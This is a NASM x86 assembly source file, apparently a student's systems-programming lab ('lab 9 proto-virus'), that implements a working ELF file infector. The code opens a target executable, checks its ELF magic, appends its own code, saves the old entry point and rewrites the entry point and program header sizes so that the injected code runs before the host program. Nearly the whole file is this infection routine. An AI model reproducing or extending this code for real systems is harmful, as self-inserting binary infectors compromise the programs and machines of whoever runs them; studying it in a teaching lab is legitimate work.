%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define stdout 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
%define EI_MAG0     0
%define ELFMAG0 0x7f

%define EI_MAG1     1
%define ELFMAG1     'E'

%define EI_MAG2		2		
%define ELFMAG2		'L'		

%define EI_MAG3		3		
%define ELFMAG3     'F'

%define	ELF_header_size	52
%define	loadAddr	0x08048000


	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here

    call getPIC ;;eax holds the PIC
    add eax, (OutStr - PIClocation) ;; get the relative location
    write stdout, eax,32 ;; print the message OutStr
    call getPIC
    add eax, (FileName - PIClocation)
    ; mov edx,eax
    ; mov ebx,eax
    ; open ebx, RDWR, 0644
            mov	ebx, eax
            mov	eax, 5
            mov	ecx, RDWR
            mov	edx, 0644
            int	0x80
    
    cmp eax,0  ;;error opening the file
    jl perhapsNot

    mov [ebp-4],eax
    lseek [ebp-4],0,SEEK_SET


    lea ecx,[ebp-200]
    read [ebp-4],ecx,116 ;; load into buffer


    ;; and now check if it holds the magic number
    cmp byte[ebp-200+EI_MAG0],ELFMAG0
    jne ErrorOpeningAndMagic
    cmp byte[ebp-200+EI_MAG1],ELFMAG1
    jne ErrorOpeningAndMagic
    cmp byte[ebp-200+EI_MAG2],ELFMAG2
    jne ErrorOpeningAndMagic
    cmp byte[ebp-200+EI_MAG3],ELFMAG3
    jne ErrorOpeningAndMagic

                ;; task 3 starts here
    
    lseek [ebp-4],0,SEEK_END
        ;;after lseek eax holds the original size of the file
    mov [ebp-8],eax
    mov eax,[ebp-176] ;; as task2 save the old entry point
    mov [ebp-12],eax
        
    call getPIC
    add eax,(_start - PIClocation)
    mov ebx,eax
    write [ebp-4],ebx,virus_end-_start - 4   ;; now add the _start func to the end of the ELFexec file
      
        ;; and now save in the end of the file the old entry --> like task 2
    lseek [ebp-4],0, SEEK_END ;; back to the start of the file
    lea ecx,[ebp-12]
    ; write [ebp-4],ecx,4
        mov		eax, 4
        mov		ebx, [ebp-4]
        mov		edx, 4
        int		0x80
        
    mov ebx,[ebp-8]
    add ebx,[ebp-108]
    sub ebx,[ebp-112]
    mov [ebp-176],ebx ;; update entry point to be the virus entry

    lseek [ebp-4],0,SEEK_END
    mov [ebp-8],eax ;; save the new size
    sub eax,[ebp-112]

    mov [ebp-100],eax ;; as task 2 update mem and size in th ebuffer
    mov [ebp-96],eax

            ;; not working
        ; mov ebx,ebp
        ; sub ebx,8 
        ; sub ebx,ELF_header_size ;; ebx point to the start of the buffer in size of 52 (start form 60 to 8 in the stack)
        ; read [ebp-4],ebx,ELF_header_size
        ; mov eax,[ebp-60+ENTRY]
        ; mov [ebp-64],eax ;; save the old entry point

        ; mov eax,[ebp-8-60+PHDR_start];; eax = file original address    
    lseek [ebp-4],0,SEEK_SET      ;; move to the PHDR_start location (fd)
    ;;load the first program header to the memory (stack)
    lea ecx,[ebp-200]
    write [ebp-4],ecx,116
    close [ebp-4]
        
    call getPIC
    add eax, (PreviousEntryPoint - PIClocation)
    jmp [eax]


VirusExit:
        call getPIC
        add eax,msg-PIClocation
        write stdout,eax,11
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
ErrorOpeningAndMagic:
        call getPIC
        add eax,msg-PIClocation
        write stdout,eax,18
    exit 1      ;;exit error


FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
msg:            db "DOME virus",10,0
mag:            db "magic dont happen",10,0
	


perhapsNot:
    call getPIC
    add eax, PreviousEntryPoint - PIClocation
    jmp [eax]
    ; write stdout,eax,20
    exit -1      ;;exit error


getPIC:
    call PIClocation

PIClocation: pop eax
    ret

PreviousEntryPoint: dd VirusExit

virus_end: